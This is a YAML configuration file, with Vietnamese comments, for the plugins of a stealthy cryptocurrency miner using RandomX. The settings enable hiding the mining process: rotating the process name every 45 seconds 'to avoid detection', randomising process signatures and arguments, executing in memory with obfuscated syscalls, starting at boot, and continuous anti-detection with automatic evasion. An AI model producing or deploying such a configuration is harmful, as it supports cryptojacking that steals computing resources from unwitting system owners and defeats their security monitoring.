plugins:
  # 1. Stealth launch – khởi chạy tiến trình mining ẩn
  - name: stealth_execution
    enabled: true
    priority: 10
    module: cloaking.stealth_plugin
    config:
      # Xoay tên tiến trình mỗi 45 giây để tránh phát hiện
      comm_rotation_interval: 45
      # Bắt đầu ngay khi khởi động hệ thống
      start_immediately: true

  
  # 3. Adaptive cloaking – điều chỉnh throttle khi threat-level thay đổi
  - name: adaptive_cloak
    enabled: true
    priority: 15
    module: cloaking.adaptive_cloak_plugin
    config: {}

  # 4. Intel CAT – chia L3 cache cho miner
  - name: intel_cat
    enabled: true
    priority: 20
    module: optimization.intel_cat_plugin
    config:
      llc_percent: 25  # dành 25 % LLC (L3)
      auto_disable_if_unsupported: true  # tự động vô hiệu khi không hỗ trợ

  # 5. RandomX optimisation – chọn profile tối ưu
  - name: randomx_opt
    enabled: true
    priority: 25
    module: optimization.randomx_opt_plugin
    config:
      profile: stealth 

  # 6. AMD optimization - tối ưu cho CPU AMD
  - name: amd_optimization
    enabled: true
    priority: 30
    module: optimization.amd_optimizations
    config:
      enable_performance_governor: true
      optimize_smt: true
      enable_ccx_affinity: true
      enable_precision_boost: true
      smt_mode: "on"
      precision_boost_enabled: true

  # 7. Signature Randomizer - ngẫu nhiên hóa chữ ký process
  - name: signature_randomizer
    enabled: true
    priority: 35
    module: cloaking.signature_randomizer
    config:
      randomization_interval: 300  # seconds
      enable_comm_randomization: true
      enable_argv_randomization: true

  # 8. Stealth Execution - thực thi ẩn danh nâng cao
  - name: stealth_exec
    enabled: true
    priority: 40
    module: cloaking.stealth_exec
    config:
      enable_memory_execution: true
      enable_syscall_obfuscation: true

  # 9. Anti Detection - chống phát hiện
  - name: anti_detection
    enabled: true
    priority: 45
    module: monitoring.anti_detection
    config:
      continuous_monitoring: true
      threat_assessment_interval: 30
      auto_evasion: true

# Cấu hình monitoring
monitoring:
  # Health probe - kiểm tra sức khỏe plugin
  health_probe:
    enabled: true
    check_interval: 30  # seconds

  # Watchdog - giám sát và khôi phục plugin
  watchdog:
    enabled: true
    auto_restart: true
    restart_cooldown_minutes: 5
    max_restart_attempts: 3

  # Prometheus exporter - xuất metrics
  prometheus:
    enabled: true
    port: 9090 